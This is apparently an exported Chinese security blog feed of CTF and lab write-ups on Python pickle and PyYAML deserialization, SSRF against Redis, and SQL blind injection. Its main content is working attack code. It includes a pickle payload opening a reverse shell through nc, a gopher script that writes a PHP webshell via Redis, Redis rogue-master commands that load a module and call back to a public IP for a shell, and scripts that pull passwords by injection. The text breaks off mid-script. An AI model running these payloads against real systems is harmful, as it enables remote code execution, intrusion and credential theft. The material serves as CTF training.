pickle模块详解pickle基础pickle是一种独立的序列化栈语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高。 序列化函数： pickle.dump(文件) pickle.dumps(字符串) 反序列化函数： pickle.load(文件) pickle.loads(字符串) pickle可序列化的对象 None 、 True 和 False 整数、浮点数、复数 str、byte、bytearray 只包含可封存对象的集合，包括 tuple、list、set 和 dict 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以） 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或 __getstate__() 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances） object.__reduce__函数 开发时，可以重写类的__reduce__方法，使之在被实例化时按照重写的方式进行。该函数在调用时返回(callable, ([para1,para2...])[,...])元组，该类在被unpickle时，其中的callable就会被调用生成对象。(其中callable是构造函数) 在opcode中，__reduce__的指令是R,它是选择栈上的第一个对象作为函数，第二个对象作为参数（该对象必须为元组），然后调用该函数。其中R真好对应__reduce__函数，该函数返回值作为R的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串也包含了R。 demo #!/usr/local/env python3 #-*— coding:utf-8 -*- import os import pickle class Student(object): def __reduce__(self): return(os.system,('ls',)) obj = Student() serialize = pickle.dumps(obj, protocol=0) print(serialize) #!/usr/local/env python3 #-*— coding:utf-8 -*- import os import pickle class Student(object): def __reduce__(self): return(os.system,('whoami',)) obj = Student() serialize = pickle.dumps(obj, protocol=0) unserialize = pickle.loads(serialize) pickle过程详解 pickle的解析依靠PVM(pickle virtual machine) PVM的构成：1 解析引擎 2 栈 3 内存 解析引擎 从流中读取opcode和参数，并对其进行解释处理。重复这个动作，知道遇到.停止。最终留在栈顶的值将被作为反序列化对象返回。 栈 由python的list实现，被用来的临时存储数据、参数以及对象 memo 由python的dict实现，将反序列化完成的数据以key-value的形式存储在memo中，以便后来使用。 PVM解析str流程 PVM解析 __reduce__() 流程 opcode版本 pickle不同的实现版本得到的opcode不相同，但是pickle可以向下兼容，目前一共有六个版本 #!/usr/local/env python3 #-*— coding:utf-8 -*- import os import pickle a = {'name':'zhang', 'age':19} for i in range(5): print(f'pickle版本{i}', pickle.dumps(a, protocol=i)) 运行结果 pickle3版本的opcode详解: {'name':'zhang', 'age':19} b'\\x80\\x03}q\\x00(X\\x04\\x00\\x00\\x00nameq\\x01X\\x05\\x00\\x00\\x00zhangq\\x02X\\x03\\x00\\x00\\x00ageq\\x03K\\x13u.' # \\x80：协议头声明 # \\x03：协议版本 # \\x04\\x00\\x00\\x00: 数据长度4 # name: 数据 # q： 存储栈顶的字符串长度: 一个字节(即\\x00) # \\x13u:代表栈顶位置 # .: 数据结束符 指令集 MARK = b'(' # push special markobject on stack STOP = b'.' # every pickle ends with STOP POP = b'0' # discard topmost stack item POP_MARK = b'1' # discard stack top through topmost markobject DUP = b'2' # duplicate top stack item FLOAT = b'F' # push float object; decimal string argument INT = b'I' # push integer or bool; decimal string argument BININT = b'J' # push four-byte signed int BININT1 = b'K' # push 1-byte unsigned int LONG = b'L' # push long; decimal string argument BININT2 = b'M' # push 2-byte unsigned int NONE = b'N' # push None PERSID = b'P' # push persistent object; id is taken from string arg BINPERSID = b'Q' # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stack REDUCE = b'R' # apply callable to argtuple, both on stack STRING = b'S' # push string; NL-terminated string argument BINSTRING = b'T' # push string; counted binary string argument SHORT_BINSTRING= b'U' # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytes UNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argument BINUNICODE = b'X' # &quot; &quot; &quot; ; counted UTF-8 string argument APPEND = b'a' # append stack top to list below it BUILD = b'b' # call __setstate__ or __dict__.update() GLOBAL = b'c' # push self.find_class(modname, name); 2 string args DICT = b'd' # build a dict from stack items EMPTY_DICT = b'}' # push empty dict APPENDS = b'e' # extend list on stack by topmost stack slice GET = b'g' # push item from memo on stack; index is string arg BINGET = b'h' # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte arg INST = b'i' # build &amp; push class instance LONG_BINGET = b'j' # push item from memo on stack; index is 4-byte arg LIST = b'l' # build list from topmost stack items EMPTY_LIST = b']' # push empty list OBJ = b'o' # build &amp; push class instance PUT = b'p' # store stack top in memo; index is string arg BINPUT = b'q' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte arg LONG_BINPUT = b'r' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte arg SETITEM = b's' # add key+value pair to dict TUPLE = b't' # build tuple from topmost stack items EMPTY_TUPLE = b')' # push empty tuple SETITEMS = b'u' # modify dict by adding topmost key+value pairs BINFLOAT = b'G' # push float; arg is 8-byte float encoding TRUE = b'I01\\n' # not an opcode; see INT docs in pickletools.py FALSE = b'I00\\n' # not an opcode; see INT docs in pickletools.py pickletools该工具可以方便的把opcode代码转化成肉眼便于阅读的形式。pickletools是python自带的pickle调试器，有三个功能：反汇编一个已经被打包的字符串、优化一个已经被打包的字符串、返回一个迭代器来供程序使用。 #!/usr/local/env python3 #-*— coding:utf-8 -*- import pickletools data = b\"\\x80\\x03}q\\x00(X\\x04\\x00\\x00\\x00nameq\\x01X\\x05\\x00\\x00\\x00zhangq\\x02X\\x03\\x00\\x00\\x00ageq\\x03K\\x13u.\" pickletools.dis(data) 得到原始字符串的反汇编结果： 反汇编功能：解析字符串，告诉你这个字符串做了什么事情，每一行都是一个指令。 优化功能: #!/usr/local/env python3 #-*— coding:utf-8 -*- import pickletools data = b\"\\x80\\x03}q\\x00(X\\x04\\x00\\x00\\x00nameq\\x01X\\x05\\x00\\x00\\x00zhangq\\x02X\\x03\\x00\\x00\\x00ageq\\x03K\\x13u.\" data = pickletools.optimize(data) pickletools.dis(data) 运行结果： 通过结果我们可以发现字符串比原来短了很多，而且反汇编结果中，BINPUT指令没有了。这里的“优化”，就是把不必要的put指令给删掉。这里的put意思就是把当前栈的栈顶复制一份，放进存储区。 pickle反序列化漏洞基本描述官方给定的pickle反序列化功能是安全的，且官方只是提供这个反序列化功能，其不安全的问题产生，主要由于传入了不安全的序列化内容，导致了不安全问题的产生。 漏洞产生的场景 web服务器解析认证token、session值时 很多web都使用redis、mongodb、memcached等来存储session等状态信息。 将对象pickle后存储成磁盘文件 将对象pickle后在网络中传输 漏洞利用当序列化及反序列化的过程中碰到一无所知的扩展类型（新式类）时，可以通过类中的定义的__reduce__方法来告知如何进行序列化或者反序列化。 我们可以通过自定义__reduce__方法来让这个类根据我们在__reduce__中指定的方式进行序列化 pyaload构造 执行系统命令payload dopickle.py #!/usr/bin/env python #coding: utf-8 import pickle import os class genpoc(object): def __reduce__(self): s = \"\"\"whoami\"\"\" #要执行的命令 return os.system, (s,) #os.system(\"echo test >poc.txt\") e = genpoc() poc = pickle.dumps(e) print(poc) pickle.loads(poc) 输出结果命令执行了 比较重要的几个操作码 c : 读取本行的内容作为模块名( module ) , 读取下一行的内容作为对象名( object ) . 然后将 module.object 作为可调用对象压入到栈中 ( : 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组 S : 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中 t : 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中 . R : 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并执行该对象 .最后将结果压入到栈中 . . : 结束整个 Pickle 反序列化过程 . 反弹shell #!/usr/bin/env python #coding: utf-8 import pickle import os class genpoc(object): def __reduce__(self): cmd = \"\"\"rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&amp;1 | nc 192.168.1.122 8888 >/tmp/f\"\"\" #要执行的命令 return (os.system, (cmd,)) #os.system(\"echo test >poc.txt\") e = genpoc() poc = pickle.dumps(e) print(poc) pickle.loads(poc) 反弹成功 ciscn 2019 Day1 Web2逻辑漏洞绕过请求首页，发现一个站点，在某处提示一定要买到lv6 且发现页面有注册有登陆功能 尝试注册账户greetdawn 123，登陆后购买lv6 直接寻找lv6在哪里，简单的翻了几页，发现并无lv6，且url有page传参，既然这么不好找，那就写个脚本试一试 #!/usr/bin/env python #coding: utf-8 import requests for i in range(2000): url = \"http://192.168.1.191:8083/shop?page={}\".format(i) r = requests.get(url) if 'lv6.png' in r.text: print(i) break 运行找到lv6存在181页 请求之后发现这玩意确实是一个天价呀，买不起买不起 购买时，抓包尝试修改价格，将价格或折扣都修改为0，发现都会显示操作失败 这边尝试另一种方式，改变价格，把折扣修改到最小，发现成功有跳转，但是返回信息提示需要admin权限 JWT伪造这边我们回到最初的请求头内，我们发现在cookie字段中存在JWT字段，既然需要admin权限，那这边我们能想到的就是使用jwt伪造 首先我们先来简单了解一下什么是jwt？ JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。 JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：HeaderPayloadSignature JWT与Session的差异 相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。 使用工具https://jwt.io/进行jwt加解密 我们发现确实这段cookie中存放了当前登录用户的用户信息 那么一次来伪造admin的jwt的值 首先我们需要使用c-jwt-cracker来跑密钥 跑出来秘钥为1Kun 带入获取admin值eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo 修改jwt值，操作成功，获取到一个源码压缩包路径/static/asd1f654e683wq/www.zip pickle反序列化请求压缩包，获取到源码内容，在源码Admin.py中存在如下pickle反序列化代码 抓取到become变量页面，编写payload的脚本 #!/usr/bin/env python #coding: utf-8 import pickle import commands import urllib class genpoc(object): def __reduce__(self): s = \"\"\"cat /flag.txt\"\"\" #要执行的命令 return (commands.getoutput, (s,)) #os.system(\"echo test >poc.txt\") e = genpoc() poc = pickle.dumps(e) print(urllib.quote(poc)) PyYaml模块详解PyYaml基础YAML是一种直观的能够被电脑识别的的数据序列化格式，容易被人类阅读，并且容易和脚本语言交互，YAML类似于XML，但是语法比XML简单得多，对于转化成数组或可以hash的数据时是很简单有效的。 大小写敏感 使用缩进表示层级关系 缩进时不允许使用Tab，只允许使用空格 缩进的空格数目不重要，只要相同层级的元素左对齐即可 ‘#’表示注释，从它开始到行尾都被忽略 yaml.load() : Python PyYAML 库版本 &lt; 5.1b1 yaml.unsafe_load() : Python PyYAML 库版本 &gt;= 5.1b1 PyYaml中的格式 yaml转字典 #!/usr/local/env python import yaml data = \"\"\" name: greetdawn age: 19 job: Player \"\"\" a = yaml.load(data) print(a) yaml转列表 #!/usr/local/env python import yaml data = \"\"\" - greetdawn - 19 - Player \"\"\" a = yaml.load(data) print(a) 复合结构类型 #!/usr/local/env python import yaml data = \"\"\" - name: greetdawn age: 18 job: teacher - name: zhangsan age: 40 job: player \"\"\" a = yaml.load(data) print(a) 纯量和标量 当字符串中不包含空格或者特殊字符时 , 可以不加引号 . 如果字符串中包含空格或特殊字符 , 就要使用引号 . 但需要注意 , 单引号会对特殊字符转义 , 双引号不会对特殊字符转义 . 强制类型转换 单个感叹号( ! )通常用于强制转换为自定义类型 , 而两个感叹号( !! )通常用于强制转换为内置类型 . #!/usr/local/env python import yaml data = \"\"\" string: !!str 3.1415926 int: !!int \"123456\" \"\"\" a = yaml.load(data) print(a) PyYaml反序列化漏洞分析 pyyaml的对象转化规则 %PYTHON-HOME%/Lib/site-packages/yaml/constructor.py 在源码中我们重点关注这个三个特殊的转换规则 construct_python_object() construct_python_object_apply() construct_python_object_new() 我们可以清晰的发现，这三个函数都调用了函数self.make_python_instance()这个函数，让我们来一起跟踪一下该函数： 该函数的逻辑是调用了find_python_name()函数，并且执行的结果赋值给cls变量，之后又将变量cls的值作为函数名，调用该函数并将执行结果返回； 这种将返回值作为函数名并调用该函数的编程方式极为危险，这里如果用户能够控制被调用函数的函数名及参数的话，那么就可以实现代码的任意执行； 这边我们继续跟进find_python_name()函数 根据代码我们可以发现，假设传入变量name的参数为os.system()，首先会尝试导入os模块，然后再判断os模块中是否存在指定的对象(system),如果该对象存在就将该对象返回。 当函数返回后，python会动态调用该函数，那么用户输入的恶意指令会被拼接到动态调用的函数中 简单的小例子 #!/usr/local/env python import os class Poc1(): def shell(self): os.system('whoami') obj = Poc1() cls = getattr(obj, \"shell\") cls() PyYaml反序列化漏洞利用 最基本条件，首先要让 PyYAML 能够解析序列化字符串 , 所以要使用 !!python 这个标签( !!python/object , !!python/object/apply , !!python/object/new都可以 ) 反序列化的过程实际上是类实例化的过程 . 只有被实例化的类中包含函数 , 且函数中包含我们的恶意代码时 , 我们的恶意代码才有可能被调用执行 普通数据类型( 字符串 , 列表 , 元组 , 字典 )的反序列化过程是纯量初始化 , 赋值的过程，不会涉及到负责逻辑处理的代码块，也就不会有代码被调用执行 . 因此 , 我们需要导入一个类 , 这个类存在一个包含恶意代码的函数 , 且该函数会被自动调用 . 我们将这个类序列化为字符串 , 再把这个字符串提交给 PyYAML 解析执行 . 常用payload汇总!!python/object/apply:subprocess.check_output [[calc.exe]] !!python/object/apply:subprocess.check_output [\"calc.exe\"] !!python/object/apply:subprocess.check_output [[\"calc.exe\"]] !!python/object/apply:os.system [\"calc.exe\"] !!python/object/new:subprocess.check_output [[\"calc.exe\"]] !!python/object/new:os.system [\"calc.exe\"]","link":"/2021/02/24/web-security/python-code-audit/python-unserialize/"},{"title":"SSRF主从复制getshell","text":"redis_getshell_ezweb环境复现ubuntu 16.04 + docker cd docker docker-compose up -d 漏洞利用右键源码发现如下备注信息 &lt;!--?secret--&gt; 直接请求，获取当前靶机环境的ip地址 直接带入提交框中进行http请求 根据url格式，和页面显示情况，怀疑是一个ssrf利用，尝试探测内网是否有redis服务，测试出redis服务的地址为192.168.144.2 并且进过后续测试发现目标环境是存在过滤的，过滤了file://,dict:// 这里直接使用gopher协议直接用脚本尝试写入webshell #!/usr/local/env python3 # -*- coding:utf-8 -*- import urllib import requests #脚本参数修改处 PATH = '/var/www/html' FILENAME = 'shell.php' DEST_REDIS_IP = '192.168.144.2' #存在redis的目标主机IP SSRF_VUL_IP = 'http://192.168.1.191:5000/index.php?url={}&amp;submit=%E6%8F%90%E4%BA%A4' # 生成payload def generate_payload(): gopher = \"gopher://{}:6379/_\".format(DEST_REDIS_IP) redis_command = \"\"\"flushall set 1 \"&lt;?php system('cat /flag');?>\" config set dir {} config set dbfilename {} save quit \"\"\".format(PATH, FILENAME) urlencode_one = urllib.parse.quote(redis_command, 'utf-8') replace_str = urlencode_one.replace('%0A', '%0D%0A') urlencode_two = urllib.parse.quote(replace_str, 'utf-8') payload = gopher + urlencode_two return payload def main(): payload = generate_payload() url = SSRF_VUL_IP.format(payload) print(url) res = requests.get(url = url, timeout = 1) print(res.text) if __name__ == '__main__': main() 根据返回信息发现，判断应该写入成功 尝试请求写入的shell，成功获取flag SSRF打内网redis主从复制复现环境这里题目使用的是2020年网鼎玄武组的一道题目 环境地址：网鼎杯 2020 玄武组 SSRFMe https://buuoj.cn/challenges url逻辑限制的绕过这里的绕过方式有很多，这里直接使用http://0.0.0.0进行绕过，请求hint.php，获取redis的密码为root 使用dict://协议进行探测，发现存在redis，且需要认证 ssrf主从复制getshell这里主要使用gopher://协议; buu的环境权限复现的有些问题，但是这不影响我们做题，直接采用预期思路解题； 公网vps使用redis-rogue-server伪造主服务 工具下载地址 https://github.com/n0b0dyCN/redis-rogue-server/ 启动服务 python3 redis-rogue-server.py --rhost=127.0.0.1 --rport=6379 --lhost=149.x.x.x 本地监听 nc -lvnp 6379 设置目录 http://e3c2954c-bbf9-47dd-a41a-b7883db9a90c.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/_ auth root config set dir /tmp/ quit %25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%34%25%36%64%25%37%30%25%32%66%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34 auth root config set dbfilename exp.so slaveof 149.129.47.247 21000 quit导入模块 auth root module load ./exp.so quit %25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%64%25%36%66%25%36%34%25%37%35%25%36%63%25%36%35%25%32%30%25%36%63%25%36%66%25%36%31%25%36%34%25%32%30%25%32%65%25%32%66%25%36%35%25%37%38%25%37%30%25%32%65%25%37%33%25%36%66%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34 关闭主从 auth root slaveof no one quit %25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%36%63%25%36%31%25%37%36%25%36%35%25%36%66%25%36%36%25%32%30%25%36%65%25%36%66%25%32%30%25%36%66%25%36%65%25%36%35%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34 设置数据库 auth root config set dbfilename dump.rdb quit %25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%34%25%37%35%25%36%64%25%37%30%25%32%65%25%37%32%25%36%34%25%36%32%25%32%30%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34 反弹shell auth root system.rev 149.129.47.247 9999 quit %25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%37%39%25%37%33%25%37%34%25%36%35%25%36%64%25%32%65%25%37%32%25%36%35%25%37%36%25%32%30%25%33%31%25%33%34%25%33%39%25%32%65%25%33%31%25%33%32%25%33%39%25%32%65%25%33%34%25%33%37%25%32%65%25%33%32%25%33%34%25%33%37%25%32%30%25%33%39%25%33%39%25%33%39%25%33%39%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34 非预期解这边是因为权限没有控制到位的原因，导致可以直接向目标服务器web目录写shell，这里就直接上脚本 #!/usr/local/env python3 # -*- coding:utf-8 -*- import urllib import requests #脚本参数修改处 PATH = '/var/www/html' FILENAME = 'shell.php' DEST_REDIS_IP = '192.168.144.2' #存在redis的目标主机IP SSRF_VUL_IP = 'http://192.168.1.191:5000/index.php?url={}&amp;submit=%E6%8F%90%E4%BA%A4' # 生成payload def generate_payload(): gopher = \"gopher://{}:6379/_\".format(DEST_REDIS_IP) redis_command = \"\"\"AUTH root flushall set 1 \"&lt;?php system('cat /flag');?>\" config set dir {} config set dbfilename {} save quit \"\"\".format(PATH, FILENAME) urlencode_one = urllib.parse.quote(redis_command, 'utf-8') replace_str = urlencode_one.replace('%0A', '%0D%0A') urlencode_two = urllib.parse.quote(replace_str, 'utf-8') payload = gopher + urlencode_two return payload def main(): payload = generate_payload() url = SSRF_VUL_IP.format(payload) print(url) #res = requests.get(url = url, timeout = 1) #print(res.text) if __name__ == '__main__': main() ssrf绕过与防御常用绕过方法1.@ http://abc@127.0.0.1 实际上是以用户名abc连接到站点127.0.0.1，同理 http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8 在对@解析域名中，不同的处理函数存在处理差异，如：http://www.aaa.com@www.bbb.com@www.ccc.com在PHP的parse_url中会识别www.ccc.com，而`libcur`l则识别为www.bbb.com 2.利用[::]可以利用[::]来绕过localhost http://[::]:80/ &gt;&gt;&gt; http://127.0.0.1 3.添加端口号 http://127.0.0.1:8080 4.利用短网址站长工具短网址百度短网址5.利用特殊域名原理是DNS解析。xip.io可以指向任意域名，即 127.0.0.1.xip.io，可解析为127.0.0.1 6.利用DNS解析在域名上设置A记录，指向127.0.17.利用进制转换 127.0.0.1八进制：0177.0.0.1十六进制：0x7f.0.0.1十进制：2130706433 8.句号 127。0。0。1 &gt;&gt;&gt; 127.0.0.1 9.302跳转使用https://tinyurl.com生成302跳转地址 常见限制手段1.限制为http://www.xxx.com 域名采用http基本身份认证的方式绕过。即@http://www.xxx.com@www.xxc.com2.限制请求IP不为内网地址当不允许ip为内网地址时（1）采取短网址绕过（2）采取特殊域名（3）采取进制转换3.限制请求只为http协议（1）采取302跳转（2）采取短地址 SSRF漏洞防御1、禁用不需要的协议(如：file:///、gopher://,dict://等)。仅仅允许http和https请求2、统一错误信息，防止根据错误信息判断端口状态3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址4、设置URL白名单或者限制内网IP","link":"/2020/08/16/web-security/ssrf/ssrf-redis-getshell-ctf/"},{"title":"SQL注入中的点点滴滴","text":"盲注中的多种技巧XOR盲注(异或盲注)基本原理异或是一种逻辑运算。 运算法则： 两个条件相同(同真或同假)即为假(0)，两个条件不同即为真（1）； null与任何条件做异或运算都为null，如果从数学的角度理解就是，空集与任何集合的交集都为空。 mysql里异或运算符为^ 或者 xor； 两个同为真的条件做异或，结果为假 两个同为假的条件做异或，结果为假 一个条件为真，一个条件为假，结果为假 null与任何条件（真、假、null）做异或，结果都为null 题目环境http://123.206.31.85:49167/index.php xor注入的基本思路是：在MySQL中异或的符号是^，该符号可以起到一种逻辑判断的作用，0^1=1、0^0=0这样可以形成一种布尔盲注的效果,对其中的字符进行逐一猜解即可。 例题解析首先请求题目发现是一个登陆框 一般对于登陆框的注入思路也就那几种，这边考察的注入出admin账户的密码。这里尝试简单的fuzz一下，发现其中过滤了or逗号，空格注释符等号等特殊字符，并且关键库information_schema也被过滤了。但是可以尝试一下payload:admin'^(ascii(substr((password)from({})))&gt;{})#，既然是盲注，那就直接上脚本好了： #!/usr/bin/env python3 #-*- coding:utf-8 -*- import requests import sys url = 'http://123.206.31.85:49167/index.php' proxies = { 'http://': '127.0.0.1:8080', } order = 1 while True: for i in range(23, 129): data = { \"username\":\"admin'^(ascii(substr((password)from({})))>{})#\".format(order, i), \"password\":\"asd\" } r = requests.post(url = url, data = data, proxies=proxies, timeout = 3) #print(r.text) if 'password error!' in r.text: sys.stdout.write(chr(i)) sys.stdout.flush() order += 1 break 跑出admin账户的密码md5值:51b7a76d51e70b419f60d3473fb6f900 尝试登录无果，直接使用MD5破解，得到明文字符skctf123456 直接尝试登录得到flag:SKCTF{b1iNd_SQL_iNJEcti0n!} regexp/relike盲注注入原理REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。 regexp基本用法 语法 select (select 语句) regexp '正则' 标准查询语句，直接返回查询结果 select username from users where id=1; 正则匹配，若匹配，则返回1，不匹配返回0 mysql&gt; select (select username from users where id=1) regexp '^d'; +-----------------------------------------------------+ | (select username from users where id=1) regexp '^d' | +-----------------------------------------------------+ | 1 | +-----------------------------------------------------+ 1 row in set (0.00 sec) mysql&gt; select (select username from users where id=1) regexp '^e'; +-----------------------------------------------------+ | (select username from users where id=1) regexp '^e' | +-----------------------------------------------------+ | 0 | +-----------------------------------------------------+ 1 row in set (0.00 sec) 注：^表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0 使用regexp表示where条件中的=号 mysql&gt; select * from users where password regexp '^ad'; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 14 | admin4 | admin4 | +----+----------+----------+ 5 rows in set (0.00 sec) 使用场景=、in、like被过滤的情况下使用 若^被过滤，可使用$来从后往前进行匹配 常用regexp正则语句： regexp '^[a-z]' #判断一个表的第一个字符串是否在a-z中 regexp '^r' #判断第一个字符串是否为r regexp '^r[a-z]' #判断一个表的第二个字符串是否在a-z中 regexp在联合查询中的使用 mysql&gt; select username,password from users where id=1 union select 1,database() regexp '^s'; +----------+----------+ | username | password | +----------+----------+ | Dumb | Dumb | | 1 | 1 | +----------+----------+ 2 rows in set (0.00 sec) mysql&gt; select username,password from users where id=1 union select 1,database() regexp '^x'; +----------+----------+ | username | password | +----------+----------+ | Dumb | Dumb | | 1 | 0 | +----------+----------+ 2 rows in set (0.00 sec) sqlilab中简单场景的运用sqli-labs靶场Less-8是一个简单的布尔盲注实验环境，这个实验环境是没有经过任何过滤的。 判断库的长度 'or (length(database())=8)--+ #返回正常 判断库名 ' or database() regexp '^s'--+ #返回正常 ' or database() regexp 'y$'--+ #返回正常 既然这么简单，就直接上个脚本一把梭 #!/usr/local/env python3 # -*- coding:utf-8 -*- import requests import string import sys strs = string.printable payloads = { \"dbname\": \"'or database() regexp '^{}'--+\", \"table_name\": \"'or (select table_name from information_schema.tables where table_schema=database() limit 1,1) regexp '^{}'--+\", \"column_name\": \"'or (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1) regexp '^{}'--+\", \"data\": \"'or (select username from users limit 1,1) regexp '^{}'--+\", } url = \"http://192.168.1.191:32769/Less-8/?id=\" temp = '' while True: for str in strs: payload = url + payloads['data'].format(temp + str) r = requests.get(url = payload) if 'You are in' in r.text: sys.stdout.write(str) sys.stdout.flush() temp += str break 例题实战简单请求发现存在robots.txt，请求后提示存在hint.txt 提示中告诉了我们一个语句select * from users where username='$_POST[&quot;username&quot;]' and password='$_POST[&quot;password&quot;]'; 并且成功注入出密码才可以得到flag 首先fuzz一下，看看过滤了哪些东西 我们发现单引号 双引号被过滤了 union select被过滤了 = like也被过滤了 至此我们大部分的过滤思路都被限制了 根据注入语句这里我们想到单引号逃逸这个手段 看fuzz结果，我们发现反斜杠没有被过滤，因此我们可以使用反斜杠将单引号转义，这要可以实现sql语句的逃逸 根据输入sql语句，假设username的值为admin\\,密码是or 1#，那么这个语句的结果将会如下: select username,password from user where username='admin\\' and password=' or 1#' 这样由于单引号被转义， 其中的and password=这部分就成了username的一部分，or 1就逃逸了出来 直接尝试regexp盲注方式，构造payload为password:or password regexp binary '^A'# 这里的binary关键字是用于区分大小写，由于直接 regexp 匹配在 3.23.4 版本后是不分大小写 这里还由于过滤的单引号，所以对带入的匹配字符进行16进制加密 这边直接上脚本 #!/usr/local/env python3 # -*- coding:utf-8 -*- import requests import string import sys str = [ord(i) for i in string.printable] url = \"http://192.168.1.191:2333/index.php\" headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'close' } # 定义字符串16进制转码函数 def ord2hex(str): result = '' for i in str: result += hex(ord(i)) result = result.replace('0x','') return '0x'+result temp = '' for i in range(50): for j in str: password = ord2hex('^'+ temp + chr(j)) #print(password) payload = 'or password regexp binary {}#' data = { \"username\": \"admin\\\\\", \"password\": payload.format(password) } r = requests.post(url = url, data = data, headers = headers, timeout= 1) if 'BJD need' in r.text: sys.stdout.write(chr(j)) sys.stdout.flush() temp += chr(j) break 注入出密码为：OhyOuFOuNdit 登录后直接获取flag order by盲注order by 子句作用：对查询返回的结果按一列或多列排序。 语法格式：ORDER BY {column_name [ASC|DASC]}[,...n] 注意：order by 语句默认按照升序对记录进行排序 基础知识select id,username,password from users order by username,password desc; select id,username,password from users order by username; 如果是按照列中的字符串来排序的话，是按照字符串的首字母以其在26字母表中的位置来排序的。如果order by的后面有多个参数，则会先照第一个参数进行排序，如果在按照第一个参数排完序之后，其中有重复的，则这些重复的会再按照第二个参数进行排序 order by 盲注概念根据不同的列排序，会返回不同的结果，因此这里可以使用类似于bool型盲注的形式来注入，即使判断结果与某种返回内容相关联，来实现注入。(即：所谓的order by盲注就是以其排序结果为基准，来判断注入语句是否被成功执行，从而来进行暴力猜解) order by常用盲注语句select * from user order by id|(if(substr(database(),1,1)='a',1,2)); 当前数据库名称的首字母为a时id和2‘与’，否则和3‘与’。 （造成两种不同的排序） select * from user order by id|(if(substr(select flag from CTF),1,1)='a',1,2)); 表CTF中flag字段的首字母为a时id和2‘与’，否则和3‘与’。（造成两种不同的排序） select * from user order by id|{select (select flag from level1_flag) regexp payload} flag匹配成功和 1 “与”，匹配失败和 0 “与”。 （造成两种不同的排序） sqlilab-less48请求传入sort变量,返回结果为查询的排序列表;输入不同查询sort,返回不同查询排序列表; ?sort=id ?sort=username 构造盲注语句，根据返回不同的排序列，猜解数据结果值； ?sort=id|(if((substr(database(),1,1)='s'),1,2))匹配返回标准排序结果 ?sort=id|(if((substr(database(),1,1)='a'),1,2))不匹配返回另外的排序结果 根据上述情况，直接编写盲注脚本： #!/usr/localenv python3 # -*- coding:utf-8 -*- import requests import sys url = \"http://192.168.1.191:32769/Less-48/?sort=id\" headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'close' } payloads = { 